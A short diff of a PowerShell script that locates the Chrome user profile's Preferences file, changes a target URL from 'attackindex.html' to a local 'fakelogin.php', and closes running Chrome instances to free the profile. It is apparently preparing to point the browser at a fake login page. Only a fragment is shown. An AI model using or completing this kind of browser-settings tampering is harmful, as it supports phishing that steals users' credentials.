@@ -1,6 +1,6 @@
 $prefPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Preferences"
 # Targets the local HTML user portal deployed to the public directory
-$targetUrl = "file:///C:/Users/Public/attackindex.html"
+$targetUrl = "file:///C:/Users/kyson/fakelogin.php"
 
 if (Test-Path $prefPath) {
     # Close any open background chrome instances to release profile file locks
